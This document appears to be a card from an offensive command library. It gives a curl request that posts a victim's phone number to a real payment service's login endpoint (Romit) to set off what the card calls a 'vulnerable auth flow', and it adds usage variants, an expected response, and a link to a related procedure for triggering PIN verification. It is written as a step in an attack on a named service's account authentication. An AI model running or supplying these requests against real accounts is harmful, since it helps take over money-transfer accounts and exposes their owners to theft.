---
id: cmd-curl-trigger-login-001
name: curl-trigger-login
type: command
executor: bash
data: >-
  curl -X POST https://api.romit.io/v0/cash/auth/login -H "Content-Type:
  application/json" -d '{"phone":"+1VICTIM_PHONE"}'
output: '{"status":"pending_pin"}'
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:56.195Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - api-call
  - trigger
verified: false
validated: true
submitted: true
---

# curl-trigger-login

## Command

```bash
curl -X POST https://api.romit.io/v0/cash/auth/login -H "Content-Type: application/json" -d '{"phone":"+1VICTIM_PHONE"}'
```

## Description

This curl command initiates the PIN verification process by sending the victim's phone number to the Romit login endpoint, triggering the vulnerable auth flow.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method for request | Yes |
| `-H "Content-Type: application/json"` | Sets JSON payload type | Yes |
| `-d '{"phone":"+1VICTIM_PHONE"}'` | JSON body with phone number | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://api.romit.io/v0/cash/auth/login -H "Content-Type: application/json" -d '{"phone":"+15551234567"}'
```

### Advanced Usage

Add auth header if session-based:

```bash
curl -X POST https://api.romit.io/v0/cash/auth/login -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d '{"phone":"+15551234567"}'
```

## Expected Output

JSON response indicating PIN pending, e.g., {"status":"pending_pin","message":"Enter PIN"}.

## Related

- [[Related Procedure: Initiate-Send-Money-to-Trigger-PIN-Verification]]
